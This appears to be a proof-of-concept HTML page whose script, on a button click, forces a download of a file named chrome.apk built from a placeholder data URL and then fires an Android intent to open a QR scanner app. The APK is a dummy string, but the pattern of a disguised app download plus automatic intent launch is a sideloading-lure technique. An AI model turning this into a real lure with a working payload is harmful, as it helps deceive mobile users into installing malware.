<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Single APK Download + Intent PoC</title>
</head>
<body>

<h3>Download chrome.apk + Intent PoC</h3>
<button id="start">Start</button>

<script>
document.getElementById('start').addEventListener('click', () => {
  try {
    // =========================
    // 1. Auto-download APK
    // =========================
    const content = "PK\nFake Chrome APK PoC\nclasses.dex\nAndroidManifest.xml\nEND";
    const base64 = btoa(content);
    const dataUrl = "data:application/vnd.android.package-archive;base64," + base64;

    const a = document.createElement('a');
    a.href = dataUrl;
    a.download = "chrome.apk"; // nama file
    a.click(); // trigger download sekali
    console.log("chrome.apk download triggered");

    // =========================
    // 2. Trigger Android Intent
    // =========================
    const intentUrl = 
      "intent://scan/#Intent;" +
      "scheme=zxing;" +
      "package=com.google.zxing.client.android;" +
      "S.browser_fallback_url=" +
      encodeURIComponent("https://play.google.com/store/apps/details?id=com.google.zxing.client.android") +
      ";" +
      "end";

    // delay sedikit supaya download tereksekusi dulu
    setTimeout(() => {
      location.href = intentUrl;
      console.log("Intent triggered");
    }, 300);

  } catch (e) {
    console.error("Error:", e);
  }
});
</script>

</body>
</html>
